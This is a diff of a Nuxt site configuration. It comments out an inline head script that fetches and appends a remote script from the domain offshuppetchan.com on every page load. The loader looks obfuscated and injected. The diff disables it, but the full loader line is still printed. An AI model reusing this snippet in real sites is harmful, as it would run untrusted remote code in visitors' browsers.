@@ -26,12 +26,12 @@ export default defineNuxtConfig({
         { rel: "icon", type: "image/png", sizes: "16x16", href: "/favicon-16x16.png" },
         { rel: "manifest", href: "/site.webmanifest" },
         { rel: "mask-icon", href: "/safari-pinned-tab.svg", color: "#0b0e0f" },
-      ],
+      ],/*
       script: [
         {
           innerHTML: "(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('offshuppetchan.com',7594585,document.createElement('script'))"
         }
-      ]
+      ]*/
     }
   },
   features: {
